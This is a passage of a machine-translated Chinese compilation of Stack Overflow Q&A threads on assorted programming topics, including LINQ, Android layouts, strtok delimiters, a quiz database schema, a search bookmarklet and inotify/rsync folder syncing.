                Page pa = (Page)HttpContext.Current.CurrentHandler;

                if (ScriptManager.GetCurrent(pa) != null)
                {
                    ScriptManager.RegisterStartupScript(pa, typeof(Page), "alert", sb.ToString(), true);
                }
                else
                {
                    pa.ClientScript.RegisterClientScriptBlock(typeof(Page), "alert", sb.ToString(), true);
                }
            }
        }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-18T07:05:44.987

不确定您如何调用该 setError。但是`$(function() {...})`是一个同义词， `$(document).ready(function(){...})`只有在页面加载后才会调用。UpadtePanel 正在执行 AJAX 调用并且不会运行`$(document).ready`事件。试试下面的代码：

```
StringBuilder sb = new StringBuilder();
sb.Append(" $('#alertError').toggle({");
sb.Append("    width: 400");
sb.Append(" });"); 
```

如果您正确执行其他所有操作，这应该可以工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-18T15:17:50.400

我修好了它。我将我的 div 放在 masterpage 中的 updatepanel 中。现在它完美无缺。

# php - 我如何测试文件写入是否在 PHP 中成功？

> ID：12460249
> 
> 赞同：6
> 
> 时间：2012-09-17T13:27:29.220
> 
> 标签：php

有什么方法可以测试写入文件是否成功完成？我需要一种方法来获取写入操作的结束时间。如果是就触发回调函数。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-17T13:30:25.053

> [fwrite()](http://php.net/manual/en/function.fwrite.php)返回写入的字节数，错误时返回 FALSE。

检查[fwrite()](http://php.net/manual/en/function.fwrite.php)是否返回 false，您将知道写入成功。检查返回值是否为假时，请注意使用`===`比较运算符而不是运算符。`==`

您可以使用[`filemtime()`](http://php.net/manual/en/function.filemtime.php)获取文件的最后修改时间。

# .net - 2个linq语句可以变成1个吗？

> ID：12460250
> 
> 赞同：3
> 
> 时间：2012-09-17T13:27:33.883
> 
> 标签：.net, linq

我有 2 个 linq 语句，如下

```
// Extracts a list of int from List<BookmarkedDeal>         
IEnumerable<int> IDs = user.BookmarkedDeals.Select(d => d.DealId);

// Calls method to return List<Deal> using IDs from previous statement
IEnumerable<Deal> deals = DealBL.FindActiveById(IDs).OrderBy(d => d.Store.Name); 
```

我认为这是可能的，但我现在无法理解它。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T13:29:03.857

这有什么问题？

```
var deals = DealBL.FindActiveById(user.BookmarkedDeals.Select(d => d.DealId))
                  .OrderBy(d => d.Store.Name); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T13:48:19.943

以防万一您想了解查询语法将如何做同样的事情：

```
var deals = from d in DealBL.FindActiveById(
                from d in user.BookmarkedDeals
                select d.DealId
            )
            orderby d.Store.Name
            select d; 
```

# c# - 对象不可访问的属性

> ID：12460256
> 
> 赞同：0
> 
> 时间：2012-09-17T13:27:48.783
> 
> 标签：c#, properties, textblock

我正在使用 C#，Silverlight。

某些对象的某些属性似乎对我不可用。例如，TextBlock 类应该有一个 Background 属性，但我的 Visual Studio 似乎没有意识到它。

我的示例代码：

```
// myTextBlock is a TextBlock, myColor is a SolidColorBrush.Color
// these objects were both initiated elsewhere
myTextBlock.Foreground= myColor; 
```

Foreground 属性工作得很好。

但是，如果我尝试 Background 属性：

```
myTextBlock.Background = myColor; 
```

这不起作用，因为 Visual Studio 无法识别 TextBlocks 具有 Background 属性。

TextBlock 类的在线文档：http: [//msdn.microsoft.com/en-us/library/system.windows.controls.textblock.aspx](http://msdn.microsoft.com/en-us/library/system.windows.controls.textblock.aspx)

知道发生了什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:31:38.350

`TextBlock.Background`在 Silverlight 中不可用。

MSDN 页面顶部有框架版本开关。将其转到“Silverlight”位置，您将看到实际的属性列表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:38:55.663

`TextBlock``Background`在 Silverlight中没有属性。它实际上没有适当的背景。将其视为文本的透明容器。

您可以使用以下方法解决此问题`Border`：

```
<Border Background="[your color]" BorderBrush="Transparent"> 
    <TextBlock ... />
</Border> 
```

但请注意：您要将所有定位/大小调整属性 ( `Grid.Row`, `Margin`...) 从`TextBlock`移动到`Border`自身以将其保持在原位。

# rest - 在泽西岛使用 HAL 实现 HATEOAS

> ID：12460259
> 
> 赞同：23
> 
> 时间：2012-09-17T13:27:56.573
> 
> 标签：rest, jersey, hateoas

构建 RESTful API 的关键点之一是 HATEOAS。现在，Jersey 提供了非常好的链接功能（请参阅[此链接](https://jersey.java.net/documentation/1.18/linking.html)）。但我看过[HAL 规范](http://stateless.co/hal_specification.html)的草案，它似乎是一个经过深思熟虑的工作。

如果有一些库可以轻松地在泽西岛遵守 HAL，我很感兴趣。我已经看到了草案中提到的参考资料，例如[https://github.com/HalBuilder](https://github.com/HalBuilder)。但我使用的是直接 POJO 编组，我不知道如何将它与 Halbuilder 混合。

那么，是否已经有一些将 HAL 纳入泽西岛的库？或者也许我可以使用某种过滤器来手动增强生成的 POJO？如果是的话，有人可以给我一个线索来完成这个任务吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-07-11T06:56:32.673

我在 Jersey 中找不到对此的任何直接支持，但是应该有方法来自定义 Jersey 用来将 POJO 转换为 JSON 的编组器。（通过使用 HalBuilder，或者创建自己的一些 HAL 兼容代码）

如果您使用基于 Jerseys [JAXB 的 JSON 支持](https://jersey.java.net/documentation/1.18/json.html#json.jaxb.approach.section)，请查看jettison 源代码中的[BootstrapTypeConverterTest](http://svn.jettison.codehaus.org/browse/jettison/trunk/src/test/java/org/codehaus/jettison/mapped/BootstrapTypeConverterTest.java?r=96)，它演示了如何使用转换器来自定义 JSON 输出。与 JSON 的单元测试转换应该是一项简单的任务，并且 jettison-project 有很好的示例可供查看。

如果您使用 Jerseys ["POJO Support"-method](https://jersey.java.net/documentation/1.18/json.html#json.pojo.approach.section)，请查看[JacksonHowToCustomSerializers](http://wiki.fasterxml.com/JacksonHowToCustomSerializers)以获取有关如何创建自定义序列化程序的类似示例。

（如果涉及 JAXB，您还可以做一些很酷的事情，例如[处理自定义注释](https://stackoverflow.com/a/19512866/15148)。）

您可能对您的对象（输入）的外观以及您期望的 JSON 代码（输出）有一个很好的了解，因此为这些转换创建单元测试应该是一项相对简单的任务。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-20T09:15:01.017

即使这不是真正的答案，我也没有足够的字符将其放在评论中:)

如果您真的是 REST 新手，我认为您可能是以错误的方式开始的。我不确切知道您的要求，但是如果您只想学习，请从简单的 REST 服务开始，使用来自 .net 的 Web API 或 Java 中的类似内容（一个简单的 servlet 就足够了），并尝试实现一个服务仅使用 http 传递的工具（动词、请求标头和有效负载、响应消息）。Marc Massé 的 REST API 设计规则手册可能是一个很好的学习参考。使用 POJO 或 POCO 创建您自己的通信协议，一旦您真正了解 REST 可以做什么以及它是如何工作的，您就可以使用框架来简化您的工作。

如果你从一个框架开始，你可能会错过这个概念的本质......

我希望它有帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-06T21:09:11.777

遵守 HAL 所需的内容很少。我建议您推出自己的迷你库，在其中将 POJO 包装在 HAL 对象中。通过这种方式，您可以按照自己喜欢的方式获取代码，并且比 HalBuilder 更简单。

# android - 将 textview 左右放置在按钮上方

> ID：12460260
> 
> 赞同：0
> 
> 时间：2012-09-17T13:27:58.003
> 
> 标签：android, android-layout, android-relativelayout

我有以下相对布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:gravity="center" 
android:orientation="vertical">

<RelativeLayout
    android:layout_width="wrap_content"
    android:layout_height="wrap_content" >

<TextView
    android:id="@+id/tv2"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="TextView"
    android:layout_alignLeft="@id/button1"/>

<TextView
    android:id="@+id/tv1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="TextView"
    android:layout_alignRight="@id/button1" />
</RelativeLayout>

<Button
    android:id="@+id/button1"
    android:layout_width="200dp"
    android:layout_height="wrap_content"
    android:text="Button" />

</LinearLayout> 
```

但这并没有给我我希望实现以下目标的结果：

tv1--------------tv2
|-----按钮------|

所以，我希望 textview1 从按钮的左角开始，而 textview2 在按钮的右边缘结束。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:34:35.220

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:gravity="center" 
android:orientation="vertical">

<RelativeLayout
    android:layout_width="wrap_content"
    android:layout_height="wrap_content" >

<TextView
    android:id="@+id/tv2"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="TextView"
    android:layout_alignLeft="@+id/button1"/>

<TextView
    android:id="@+id/tv1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="TextView"
    android:layout_alignRight="@+id/button1" />

<Button
    android:id="@+id/button1"
    android:layout_width="200dp"
    android:layout_height="wrap_content"
    android:text="Button"
    android:layout_below="@+id/tv1" />
</RelativeLayout>  

</LinearLayout> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:31:13.307

试试这个

```
 <?xml version="1.0" encoding="utf-8"?>
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
 android:layout_width="match_parent"
 android:layout_height="match_parent"
 android:gravity="center" 
 android:orientation="vertical">

 <RelativeLayout
   android:layout_width="wrap_content"
   android:layout_height="wrap_content" >

 <TextView
     android:id="@+id/tv2"
     android:layout_width="wrap_content"
     android:layout_height="wrap_content"
     android:text="TextView"
     android:layout_alignParentLeft="true"/>

 <TextView
     android:id="@+id/tv1"
     android:layout_width="wrap_content"
     android:layout_height="wrap_content"
     android:text="TextView"
     android:layout_alignParentRight="true"/>
 </RelativeLayout>

 <Button
     android:id="@+id/button1"
     android:layout_width="200dp"
     android:layout_height="wrap_content"
     android:text="Button" />

 </LinearLayout> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T13:31:45.730

将按钮放在您的相对布局中。然后将其添加到按钮 xml 属性中 -

```
android:layout_below="@+id/tv1" 
```

对于 tv1 文本视图，添加 -

```
android:layout_alignLeft="button1" 
```

对于 tv2 textview，添加 -

```
android:layout_alignRight="button1" 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T13:34:32.903

试试这个

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:gravity="center" 
android:orientation="vertical">

<RelativeLayout
   android:layout_width="match_parent"
   android:layout_height="wrap_content" >

 <TextView
     android:id="@+id/tv2"
     android:layout_width="wrap_content"
     android:layout_height="wrap_content"
     android:text="TextView"
     android:layout_alignParentRight="true"/>

 <TextView
     android:id="@+id/tv1"
     android:layout_width="wrap_content"
     android:layout_height="wrap_content"
     android:text="TextView"
     android:layout_alignParentLeft="true"
     android:layout_toLeftOf="@id/tv2"/>
 </RelativeLayout>

<Button
    android:id="@+id/button1"
    android:layout_width="200dp"
    android:layout_height="wrap_content"
    android:text="Button" />

</LinearLayout> 
```

您需要为 tv1 设置 android:layout_toLeftOf="@id/tv2" 或为 tv2 设置 android:layout_toRightOf="@id/tv1" 以停止相互重叠。

# jquery - Ajax 在其他域链接上不起作用

> ID：12460263
> 
> 赞同：0
> 
> 时间：2012-09-17T13:28:15.693
> 
> 标签：jquery, ajax

我正在使用 ajax 代码，当我在调用和响应的同一域下使用文件名时，但是当我使用 url 链接调用 php 文件时，文件正在调用但我没有得到响应，我已经测试它在php文件上写了一个邮件函数，邮件正在发送但没有回应

```
$.get("http://otherserver.com/wp-content/plugins/maya-shop/hello.php",{c_id:5,licence_no:6},function(data,status) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:33:48.443

不允许 Ajax 调用其他域上的脚本。这是关于如何克服同源策略的另一篇好文章：[绕过同源策略的方法](https://stackoverflow.com/questions/3076414/ways-to-circumvent-the-same-origin-policy)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-18T12:20:35.583

我找到了解决办法。这里需要使用 .getJSON() 来克服同源策略的问题；[在http://api.jquery.com/jQuery.getJSON/](http://api.jquery.com/jQuery.getJSON/)中获取详细信息

# c - C - 确定使用哪个分隔符 - strtok()

> ID：12460264
> 
> 赞同：10
> 
> 时间：2012-09-17T13:28:16.460
> 
> 标签：c, tokenize, strtok

假设我正在使用`strtok()`这样的..

```
char *token = strtok(input, ";-/"); 
```

有没有办法确定实际使用了哪个令牌？例如，如果输入类似于：

```
你好呀; 你好吗？/ 我很好 - 结束
```

我可以弄清楚每个令牌使用了哪个分隔符吗？我需要能够输出特定的消息，具体取决于令牌后面的分隔符。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-17T13:40:41.567

重要：`strtok`不可重入，你应该使用[`strtok_r`](http://www.mkssoftware.com/docs/man3/strtok_r.3.asp)它来代替它。

您可以通过保存原始字符串的副本并查看当前令牌在该副本中的偏移量来实现：

```
char str[] = "Hello there; How are you? / I'm good - End";
char *copy = strdup(str);
char *delim = ";-/";
char *res = strtok( str, delim );
while (res) {
    printf("%c\n", copy[res-str+strlen(res)]);
    res = strtok( NULL, delim );
}
free(copy); 
```

这打印

```
;
/
- 
```

[演示#1](http://ideone.com/AEROJ)

**编辑：** *处理多个分隔符*

如果您需要处理多个分隔符，确定当前分隔符序列的长度会稍微困难一些：现在您需要在确定分隔符序列有多长之前找到下一个标记。数学并不复杂，只要记住`NULL`需要特殊处理即可：

```
char str[] = "(20*(5+(7*2)))+((2+8)*(3+6*9))";
char *copy = strdup(str);
char *delim = "*+()";
char *res = strtok( str, delim );
while (res) {
    int from = res-str+strlen(res);
    res = strtok( NULL, delim );
    int to = res != NULL ? res-str : strlen(copy);
    printf("%.*s\n", to-from, copy+from);
}
free(copy); 
```

[演示#2](http://ideone.com/U5PBTr)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-17T13:33:14.593

你不能。`strtok`用 nul 字符覆盖下一个分隔符（为了终止它这次返回的令牌），并且它不存储它覆盖的前一个值。第一次调用`strtok`示例字符串时，`;`就永远消失了。

如果您保留正在修改的字符串的未修改副本，则可以做一些事情`strtok`- 给定当前令牌的 nul 终止符的索引（相对于字符串的开头），您可以查看副本中的相同索引看看那里有什么。

当然，这可能比编写自己的代码来分隔字符串更糟糕。您可以使用`strpbrk`or `strcspn`，如果您可以忍受生成的令牌不会为您终止。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-17T13:39:17.317

> 男子 3 strtok
> 
> strtok() 和 strtok_r() 函数在将标记本身替换为 NUL 字符后，返回指向字符串中每个后续标记开头的指针。当没有更多标记时，返回一个空指针。

但是通过一点指针算术，您可以执行以下操作：

```
char* string = "Hello,World!";
char* dup = strdup(string);

char* world = strtok(string, ",");
char delim_used = dup[world - string];

free(dup); 
```

# soundcloud - 访问 soundcloud 曲目

> ID：12460267
> 
> 赞同：0
> 
> 时间：2012-09-17T13:28:22.823
> 
> 标签：soundcloud

我想构建一个应用程序，用于对由 soundcloud 录制和/或流式传输的曲目（日常音轨而不是语音或音乐）进行分析和分类。

这个想法是使用现有的 soundcloud 基础结构（数据库、记录、共享、评论......），并在两者之间添加一个分析级别。

是否可以通过 API 访问跟踪二进制文件？我们想处理其中的一些。

还有一种方法可以在录制期间访问音频流吗？它用于实时分类任务。

谢谢

鲍里斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T08:06:51.487

有些用户允许下载他们的曲目，有些则不允许。在其中一个可下载的曲目上，曲目信息将带有`download_url`，您可以随意下载和处理。至于在录制过程中访问流，在那个时间点，该文件在 SoundCloud 上尚不存在（仅在录制完成后才上传）。您可以编写自己的 Flash 录音机或使用 Web Audio API 在录制过程中获取音频信息。

# ios - 带有按钮的滚动视图，当在 ios 中点击该按钮时该按钮会展开

> ID：12460268
> 
> 赞同：0
> 
> 时间：2012-09-17T13:28:23.277
> 
> 标签：ios, button, scrollview

我是IOS开发的新手，我想问一下如何制作一个滚动视图，其中的一些按钮水平对齐，其中当您点击其中一个按钮时，滚动视图会展开并显示信息数据，以及当您再次点击它时它收缩或再次恢复正常大小）。就像您在 iPhone 上打开分组应用程序时一样

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T13:30:04.840

在您`UIButton`尝试更改`UIScrollView`' 框架的操作中。

# php - MySQL/PHP 测验引擎 - 防止多次尝试

> ID：12460271
> 
> 赞同：4
> 
> 时间：2012-09-17T13:28:28.600
> 
> 标签：php, mysql, database

我正在使用 PHP 和 MySQL 编写一个基于 Web 的测验应用程序。我不想让你特别厌烦它的细节，所以这就是（我认为）你需要知道的。

问题都是多项选择，可以存储在一个包含几列的简单表中：

1.  ID：题号（主索引）
2.  类别：此问题所属的类别（例如动物、蔬菜、矿物质）
3.  文本：问题词干（例如什么是 1+1？）
4.  答案 1：可能的答案（例如 2）
5.  答案 2：一个可能的答案（例如 3）
6.  答案 3：一个可能的答案（例如 4）
7.  CorrectAnswer：问题的正确答案（1、2 或 3（在本例中为 1））

用户可以通过创建用户名和密码进行注册，然后尝试从类别中提问。

问题是我写的问题被设计为不止一次尝试。但是，需要向用户提供有关其进度的详细反馈。问题的第一次尝试很重要，并有助于用户的整体“问题第一次回答”得分。因此，我需要记录一个问题被尝试了多少次。

由于该应用程序被设计为灵活的，我希望为数百名尝试数千个问题的用户提供支持。因此，试图将这些信息整合到用户表或问题表中似乎是不可能的。我想解决这个问题的方法是在*每个用户*注册后为他们创建一个新表，其中包含不同的列。

1.  表名：用户的个人表（例如 TableForUser51204）
2.  QuestionID：用户尝试的问题的 ID。
3.  CorrectFirstTime：一个布尔值，说明问题是否第一次被正确回答。
4.  正确：问题被正确回答的次数。
5.  不正确：问题被错误回答的次数。

所以我想我想问的是，以这种方式组织数据库是否是明智之举。有没有更好的方法而不是为每个用户创建一个新表？如果有 500 个用户和 2000 个问题，这会对性能造成多大影响？

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-17T13:37:46.187

您*不想*为每个用户创建一个新表。相反，修改您的数据库结构。

通常，您会有一个问题表、一个选项表（可能有一个布尔列来指示它是否是正确答案）、一个用户表和一个用户表和一个用于存储用户响应的选项的连接表。示例架构：

```
CREATE TABLE `options` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `question_id` int(10) unsigned NOT NULL,
  `text` varchar(255) NOT NULL,
  `correct` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `question_id` (`question_id`)
) TYPE=InnoDB;

CREATE TABLE `options_users` (
  `option_id` int(10) unsigned NOT NULL,
  `user_id` int(10) unsigned NOT NULL,
  `created` timestamp NOT NULL,
  KEY `option_id` (`option_id`),
  KEY `user_id` (`user_id`)
) TYPE=InnoDB;

CREATE TABLE `questions` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `question` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `id` (`id`,`question`)
) TYPE=InnoDB;

CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(60) NOT NULL,
  `password` char(40) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) TYPE=InnoDB;

ALTER TABLE `options`
  ADD CONSTRAINT `options_ibfk_1` FOREIGN KEY (`question_id`) REFERENCES `questions` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

ALTER TABLE `options_users`
  ADD CONSTRAINT `options_users_ibfk_2` FOREIGN KEY (`option_id`) REFERENCES `options` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  ADD CONSTRAINT `options_users_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE; 
```

这将选项链接到问题，以及用户对选项的响应。我还在表格中添加了一`created`列，`options_users`以便您可以查看用户何时回答问题并跟踪他们的进度。

# javascript - 需要 javascript 小书签帮助

> ID：12460273
> 
> 赞同：0
> 
> 时间：2012-09-17T13:28:51.847
> 
> 标签：javascript, bookmarklet

我的 javascript 经验为零，但我相信可以通过使用 Firefox/Chrome 的书签来大大加快这项任务。我一直在寻找几个小时，但没有任何基本教程可以为我提供所需的帮助。

简而言之，我希望创建一个书签，它将搜索我所在的网站（即 stackoverflow.com）以查找特定的硬编码文本。我每天经常重复这些搜索数百次，并试图找到一种方法来加快这个过程。

我通常搜索单个关键字，但有时会组合搜索，即：非营利性或基金会或资助者（有时包括 filetype:pdf 修饰符）。

如果有人能指出我正确的方向或向我展示此类搜索的基本代码片段，我将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:37:08.650

它可能看起来像这样：

```
javascript:var s = 'test'; window.open('http://www.google.com/search?q=' + encodeURI(s + ' site:' + location.hostname), 'bookmarklet') 
```

其中`s`变量是您预定义的搜索查询。查询可以以 Google 允许的任何方式形成，包括`filetype:`关键字。单击小书签将打开一个新窗口/选项卡，在您正在浏览的站点中搜索给定的查询。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:38:23.207

`javascript:window.open("http://google.com/?q=site:"+document.domain);`会将您转储到谷歌搜索当前域...

# bash - 如何保持两个文件夹自动同步？

> ID：12460279
> 
> 赞同：108
> 
> 时间：2012-09-17T13:29:14.143
> 
> 标签：bash, synchronization

我想拥有一个文件夹及其所有子树的同步副本。

它应该以这种方式自动工作：每当我从原始文件夹创建、修改或删除内容时，这些更改应该自动应用于同步文件夹。

完成这项任务的最佳方法是什么？

顺便说一句：我在 Ubuntu 12.04

最终目标是拥有一个单独的实时备份副本，而不使用符号链接或挂载。我使用 Ubuntu One 在我的计算机之间同步数据，但过了一段时间出现了问题，我的所有数据在同步过程中都丢失了。

所以我想进一步添加一个步骤来保留我的数据的备份副本：

*   我将数据保存在“文件夹 A”中
*   我需要我当前问题的答案来创建“文件夹 A”到“文件夹 B”的单向同步（`cron`带有`rsync`? 的脚本可能是？）。我需要它只从 A 到 B 是单向的，对 B 的任何更改都不能应用于 A。
*   我只是与 Ubuntu One 保持同步的“文件夹 B”

    这样，A 中的任何更改都将应用到 B，这将从 U1 检测到并同步到云。如果出现任何问题并且 U1 删除了我在 B 上的数据，我总是将它们保存在 A 上。

受 lanzz 评论的启发，另一个想法可能是在启动时运行 rsync 以备份 Ubuntu One 下文件夹的内容，并仅在 rsync 完成后启动 Ubuntu One。

你怎么看？如何知道 rsync 何时结束？

* * *

## 回答 #1

> 赞同：126
> 
> 时间：2016-11-10T10:25:00.900

您可以使用`inotifywait`（`modify,create,delete,move`启用标志）和`rsync`.

```
while inotifywait -r -e modify,create,delete,move /directory; do
    rsync -avz /directory /target
done 
```

如果您的系统上没有`inotifywait`，请运行`sudo apt-get install inotify-tools`

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2016-04-13T09:31:28.777

你需要这样的东西： [https://github.com/axkibe/lsyncd](https://github.com/axkibe/lsyncd) 它是一个结合了 rsync 和 inotify 的工具 - 前者是一个镜像工具，通过正确的选项集，一个目录到最后一位。后者告诉内核通知程序对目录 ot 文件的更改。它说：

> 它在几秒钟内聚合和组合事件，然后生成一个（或多个）进程以同步更改。

但是 - 根据[https://www.digitalocean.com/community/tutorials/how-to-mirror-local-and-remote-directories-on-a-vps-with-lsyncd](https://www.digitalocean.com/community/tutorials/how-to-mirror-local-and-remote-directories-on-a-vps-with-lsyncd)上的 Digital Ocean - 它应该在Ubuntu存储库！

我有类似的要求，我还没有尝试过的这个工具似乎适合这项任务。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2018-09-23T14:50:27.450

只需简单修改@silgon 答案：

```
while true; do 
  inotifywait -r -e modify,create,delete /directory
  rsync -avz /directory /target
done 
```

（如果您在 cron 中运行，@silgon 版本有时会在 Ubuntu 16 上崩溃）

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-10-16T06:09:45.940

您可以利用[fschange](http://stefan.buettcher.org/cs/fschange/)。这是一个 Linux 文件系统更改通知。源代码可以从上面的链接下载，你可以自己编译。`fschange`可用于通过从 proc 文件 (/proc/fschange) 读取数据来跟踪文件更改。将数据写入文件时，fschange 会报告已修改的确切时间间隔，而不仅仅是说文件已更改。如果您正在寻找更高级的解决方案，我建议您查看[Resilio Connect](https://www.resilio.com/connect)。它是跨平台的，提供了使用和监控的扩展选项。由于它是基于 BitTorrent 的，它比任何其他现有的同步工具都快。它是代表他们写的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-01-08T16:12:46.383

我使用这个免费程序来同步本地文件和目录：[https](https://github.com/Fitus/Zaloha.sh) ://github.com/Fitus/Zaloha.sh 。该存储库还包含一个简单的演示。

优点：它是一个 bash shell 脚本（只有一个文件）。不像其他程序那样是黑匣子。文档也在那里。此外，借助一些技术人才，您可以“弯曲”和“整合”它以创建您喜欢的最终解决方案。

# java - 如何根据java中两个文件之间的公共字段删除一个文件上的重复行

> ID：12460280
> 
> 赞同：0
> 
> 时间：2012-09-17T13:29:18.983
> 
> 标签：java, file

我有两个文件

1.  文件 1 包含 3 个字段
2.  文件 2 包含 4 个字段

文件1的行数远小于文件2

我想根据第一个字段比较两个文件。第一个字段类似于主键，它不重复（无重复）并且不会为空。我已经通过了 java 的 diff util 但它只是比较文件差异，而不是文件之间基于列的差异。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T13:31:08.693

Diff 听起来是个不错的方法。您需要做的就是预处理文件以提取要在差异中使用的“列”。

由于您实际上没有描述文件格式，因此很难比这更具体。你的列分隔符是什么？

# asp.net-mvc - 带有列表的模型 - 从 Razor 视图将新项目添加到列表的方法

> ID：12460285
> 
> 赞同：3
> 
> 时间：2012-09-17T13:29:32.180
> 
> 标签：asp.net-mvc, razor

我有一个具有各种属性的模型，但感兴趣的是另一种模型的列表。

例如：

```
 public class User
    {
        public string Name { get; set; }
        public string Description { get; set; }

        public IEnumerable<UserInterest> Interests { get; set; }
    } 
```

然后，我在视图中使用编辑器模板为模型项的每个项呈现视图。

```
@Html.EditorFor(x => x.Interests) 
```

EditorFor 模板类似于：

```
@model Interest

<div>
    @Html.HiddenFor(x => x.Id)
    @Html.TextBoxFor(x => x.InterestText)
    @Html.CheckBoxFor(x => x.Delete)
   ....
</div> 
```

与此处接受的答案非常相似：[包含模型列表的模型（MVC-3，Razor）](https://stackoverflow.com/questions/4720330/model-containing-list-of-models-mvc-3-razor)

我的问题是-您将如何从客户端（jQuery）在属性中创建一个新项目而不返回服务器。我目前有一个粗略的方法，即我将数据发布回我的控制器，控制器返回模型，并在 Interests 属性中添加一个新的空白项。

发出 HTTP 请求似乎有点过头了，而且不是很优雅。我正在考虑使用 jQuery .Clone() 但不完全确定在命名元素和清除现有值方面我需要做什么。

所以有没有人有任何建议。我希望得到更多的意见和不同的方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:40:44.353

您可以简单地动态创建文本框和复选框并将其添加到 DOM。保存时，使用 jQuery ajax 将该数据（新记录数据）发布到操作方法并将其保存在那里。从您的操作方法返回一个状态（成功/失败）到您的客户端代码（您的 jQuery ajax/post 的回调函数）并在那里检查它。如果成功，则向用户显示成功消息，`append`并向现有列表显示新项目。

示例 jSFiddle：http: [//jsfiddle.net/carwB/2/](http://jsfiddle.net/carwB/2/)

如果您想返回一些复杂的数据（例如：所有新记录及其 id 等）以及状态，您可以`JSON`从您的操作方法返回。

**编辑：**要使您的模型绑定与新添加的动态元素一起使用，您需要遵循元素的命名约定。

诀窍是将 html 元素的 id 属性值保持为这种格式。 **CollectionName_ *ItemIndex* __PropertyName**

并以此格式命名属性值

**集合名称 [ *ItemIndex* ].PropertyName**

我创建了一个示例工作程序，并根据您的要求[解释](http://www.techiesweb.net/asp-net-mvc3-dynamically-added-form-fields-model-binding/)了它是如何工作的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:56:33.897

1.创建两个局部视图，一个是列表项，第二个是创建

2.第一个部分视图应该在具有 id 'divMdeolList' 的 div 内

3.和创建视图将有这样的代码

```
@using (Ajax.BeginForm("SubmitData", new AjaxOptions { UpdateTargetId = "divMdeolList" }))
{
 @Html.TextBoxFor(x => x.InterestText)
  <p>
            <input type="submit" value="Create" />
  </p>
} 
```

4\. 然后在控制器上创建一个 ActionResult 类型的动作来渲染局部视图

```
public ActionResult SubmitData(YourModel model)
{  
  //Do : save the record 
  return PartialView("FirstPartailView", model);
} 
```

这将在不回发的情况下更新视图

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T13:45:01.497

在这种情况下，我更喜欢使用客户端模板。您使用 ajax 将数据发送到服务器，然后接收`JsonResult`. 看看[JsRender](http://borismoore.github.com/jsrender/demos/demos.html)这是没有 jQuery 依赖的 javascript 库。

# javascript - 如何使一个元素仅可单击一次，而其他元素仍可单击以执行操作？

> ID：12460287
> 
> 赞同：0
> 
> 时间：2012-09-17T13:29:47.670
> 
> 标签：javascript, jquery, twitter-bootstrap

